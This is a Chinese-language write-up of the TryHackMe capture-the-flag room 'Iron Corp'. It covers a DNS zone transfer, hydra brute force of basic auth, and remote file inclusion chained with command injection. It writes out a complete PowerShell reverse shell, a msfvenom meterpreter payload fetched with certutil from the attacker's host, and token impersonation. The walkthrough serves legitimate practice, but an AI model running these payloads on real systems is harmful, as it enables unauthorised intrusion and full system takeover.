# Iron Corp

https://tryhackme.com/room/ironcorp

难度：难

不久前，钢铁公司遭受了安全漏洞。

您已被钢铁公司选中对其资产进行渗透测试。他们进行了系统强化，并期望您无法访问他们的系统。

范围内的资产为：ironcorp.me

注意：编辑配置文件并添加 ironcorp.me

你能访问钢铁公司的系统吗？

---

## 端口扫描

循例 nmap扫

    nmap -sS 10.10.91.218 -Pn -p- -T5

    53/tcp    open  domain
    135/tcp   open  msrpc
    3389/tcp  open  ms-wbt-server
    8080/tcp  open  http-proxy
    11025/tcp open  unknown
    49667/tcp open  unknown
    49670/tcp open  unknown

## 目录扫描

web一顿看没啥东西，gobuster扫目录也没扫出什么东西

11025端口也是web，gobuster扫，也是没啥东西

## dns域传送漏洞

回来再看一眼nmap扫描结果，使用dig看看dns

    dig ironcorp.me axfr @10.10.91.218

子域返回来了：

    ; <<>> DiG 9.18.8-1-Debian <<>> ironcorp.me axfr @10.10.91.218
    ;; global options: +cmd
    ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
    ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
    admin.ironcorp.me.	3600	IN	A	127.0.0.1
    internal.ironcorp.me.	3600	IN	A	127.0.0.1
    ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600

将这两个子域添加到我们的/etc/hosts

在8080端口下这两个子域的内容跟之前的一样

## 身份验证爆破

http://internal.ironcorp.me:11025/ 禁止访问

http://admin.ironcorp.me:11025/ 弹出登录框

回到这个页面有用户名

    http://ironcorp.me:8080/profile.html

打开burp抓包刚刚登录框

抓到的包的部分请求头：

    Authorization: Basic YWRtaW46YWRtaW4=

base64解码后，确认这就是我们登录的凭据

    admin:123456

由于前面的网页中我们看见了mark用户，所以我们选择爆破mark

    hydra -l mark -P /usr/share/wordlists/rockyou.txt -f admin.ironcorp.me -s 11025 http-get /

好像爆不出来，也没别的信息了，再尝试爆最有可能的admin

靶机不知道怎么回事，被扫爆了还是怎么着，炸了，平台那边关也关不掉，害我白等一小时

爆admin:

    hydra -l admin -P /usr/share/wordlists/rockyou.txt -f admin.ironcorp.me -s 11025 http-get /

出来结果了：

    [11025][http-get] host: admin.ironcorp.me   login: admin   password: ********

## RFI（远程文件包含）

登录进去是一个“查询框”，尝试了几遍，确定存在RFI

尝试远程包含shell：

    view-source:http://admin.ironcorp.me:11025/?r=http://10.14.39.48:8000/linux-tools_and_exp/php_simple_cmd.php

尝试了好几种，都不行，它仅仅读取文件内容。貌似并不会将其执行

我们在上面有一个禁止访问的url，尝试一下看看能不能越权访问到：

    http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/

果然可以，我们得到了：

    http://internal.ironcorp.me:11025/name.php?name=

这个也是拒绝访问，没关系，我们继续通过RFI访问

fuzzing一些符号，有一些符号有猫腻：

    ||、&&、|

这些符号很熟悉，因为它能够帮助我们执行命令。

使用“|”管道符，将前一个命令输出作为后一个命令的输入，它将能显示输出我们执行的命令结果，验证：| whoami

    My name is:

	    nt authority\system

## Reverse Shell

payload:

    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.14.39.48',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

成功getshell

注意，我们需要进行两次url编码，否则该payload将无法生效，因为有空格

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nc</font> <font color="#9755B3">-vlnp</font> 8888                
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.8.68.
Ncat: Connection from 10.10.8.68:50313.
whoami
nt authority\system
PS E:\xampp\htdocs\internal&gt; 
</pre>

靶机又崩了，还好这次可以正常重启靶机

user.txt在C:\users\administrator\desktop

## Token模拟

msfvenom生成meterpreter的reverse shell

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.14.39.48 lport=8889 -f psh > she11.ps1

上传到目标机器：

    certutil -urlcache -split -f "http://10.14.39.48:8000/she11.ps1"

目标运行：

    . .\she11.ps1

成功

加载incognito模块

    load incognito

查看可用的user token:

    list_tokens -u

模拟：

    impersonate_token "WIN-8VMBKF3G815\Admin"

root.txt在C:\Users\Admin\Desktop下
